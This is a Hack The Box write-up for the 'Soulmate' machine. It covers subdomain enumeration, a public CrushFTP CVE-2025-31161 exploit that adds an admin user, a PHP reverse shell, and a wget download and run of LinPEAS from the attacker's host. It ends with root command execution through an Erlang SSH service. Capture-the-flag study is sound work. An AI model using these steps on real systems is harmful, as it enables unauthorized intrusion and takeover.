# [Soulmate](https://app.hackthebox.com/machines/721) – Writeup

## Short description:

Soulmate is a machine combining web enumeration, exploiting CrushFTP, privilege escalation via Erlang configuration leaks, and ultimately gaining root access through an Erlang SSH service.

## Enumeration

We start scanning with Rustscan:

```python
rustscan -a 10.10.11.86
```

Open ports:

```python
22/tcp – SSH

80/tcp – HTTP

4369/tcp – EPMD (Erlang Port Mapper Daemon)
```

## Initial Recon

Browsing port 80, we discover the domain:

```soulmate.htb```


We add it to ```/etc/hosts```:

```python
sudo nano /etc/hosts
10.10.11.86 soulmate.htb
```

The main page contains nothing useful, so we brute-force subdomains:

```python
ffuf -u http://10.10.11.86 -H "Host: FUZZ.soulmate.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4
```

We find:

```ftp.soulmate.htb```

## Exploiting CrushFTP

Visiting ```ftp.soulmate.htb``` shows ```CrushFTP```.
Looking at the HTML source reveals the version:

<b>CrushFTP 11.W.657</b>


This matches <b>[CVE-2025-31161](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)</b>. Using a public exploit, we create a new user:

```python
python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 \
--target_user root --new_user user1 --password 12345678
```

We log in as user1, go to ```Admin → User Manager```, find the user ben, and set a new password for ben (e.g. 12341234).

Now we log out and log back in as ben, which allows us to upload files to ```/webProd/```.

We upload our PHP reverse shell:

```python
nc -lvnp 4444
curl http://ftp.soulmate.htb/shell.php
```

We get a ```www-data``` shell.

## Post-Exploitation & Lateral Movement

We transfer ```LinPEAS``` to enumerate the system:

On our machine:

```python
python -m http.server
```

On the victim:

```python
cd /tmp
wget http://10.10.10.10:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS finds an interesting file:

```python
/usr/local/lib/erlang_login/start.escript
```

Reading it reveals SSH credentials for ```ben```:

```python
{auth_methods, "publickey,password"},
{user_passwords, [{"ben", "***********"}]},
```

We SSH in as ben:

```python
ssh ben@10.10.11.86
```

We now have a proper shell and can read ```user.txt```.

## Privilege Escalation

```sudo -l``` shows nothing useful.

Further inspection from LinPEAS shows an Erlang SSH service running on port ```2222``` locally.

We connect to it from the machine itself:

```python
ssh ben@localhost -p 2222
```

Inside the Erlang shell, we can execute system commands directly:

```python
os:cmd("cat /root/root.txt").
```

This outputs the root flag.
